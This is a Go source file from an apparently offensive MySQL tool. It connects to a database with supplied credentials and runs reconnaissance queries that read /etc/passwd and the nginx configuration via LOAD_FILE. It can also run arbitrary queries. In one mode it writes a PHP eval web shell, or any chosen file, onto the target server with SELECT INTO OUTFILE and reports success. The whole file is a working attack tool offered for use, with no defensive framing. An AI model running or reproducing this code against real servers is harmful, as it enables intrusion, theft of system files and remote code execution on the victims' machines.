package cmdpackage

import (
	"Rpcon/common"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"github.com/jmoiron/sqlx"
	"golang.org/x/net/context"
	"io/ioutil"
	"log"
	"strconv"
)

var (
	mysqread = []string{"SELECT LOAD_FILE('/etc/passwd')", "select user()", "show variables like '%plugins%' ;", "select @@version_compile_os", "SELECT LOAD_FILE('/etc/nginx/nginx.conf' )", "show global variables like 'secure%';", "show variables like '%general%';"}
	result   string
	username string
	key      string
	aaa      string
	time1    string
	time2    string
)

func mysqlcmd() {
	dsn := common.User + ":" + common.Password + "@tcp(" + common.Host + ":" + strconv.Itoa(common.Port) + ")/" + common.DBname
	//dsn := "root:root@(192.168.84.133:3306)/mysql"
	//fmt.Println(dsn)
	db, err := sqlx.Open("mysql", dsn)
	//println(db.Ping())

	if err != nil {
		fmt.Println(err)
	}
	defer func() { db.Close() }()
	db.SetMaxOpenConns(20)
	db.SetMaxIdleConns(10)
	ctx := context.Background()
	for i, _ := range mysqread {
		sqle, err := db.QueryContext(ctx, mysqread[i])
		if err != nil {
			fmt.Println("读取失败")
		}
		for sqle.Next() {
			err := sqle.Scan(&result)
			if err != nil {
				sqle.Scan(&time1, &time2)
				log.Println(time1, time2+"\n")
			} else {
				log.Println(result + "\n")
			}
		}
	}
	if common.Code != "ms" && common.Code != "" {
		rows, err := db.QueryContext(ctx, common.Code)
		if err != nil {
			log.Println(err)
		}
		for rows.Next() {
			// Scan()遍历并赋值给变量
			err := rows.Scan(&username)
			if err != nil {
				log.Fatal(err)
			}
			log.Println(username)
		}
	}
	if common.Code == "ms" {

		if common.File != "" {
			key, err = Readfile(common.File)
			if err != nil {
				fmt.Println("打开文件失败")
			}
		} else {
			key = "<?php @eval($_POST[1]);?>"
		}
		path := fmt.Sprintf("select '%s' into outfile '%s';", key, common.Path)
		ss, err := db.QueryContext(ctx, path)
		if err != nil {
			fmt.Println("写入shell失败，目标没有写入权限或者文件名相同 请重新确认文件名和路径")
		} else {
			log.Println("写入shell成功")
		}
		for ss.Next() {
			err := ss.Scan(&aaa)
			if err != nil {
				log.Println(err)
			}
			log.Println("写入shell成功")
		}
	}

}

func Readfile(filename string) (string, error) {
	s := ""
	file, err := ioutil.ReadFile(filename)
	if err != nil {
		log.Println("打开文件失败")
	}
	s = fmt.Sprintf("%s", file)
	return s, err
}
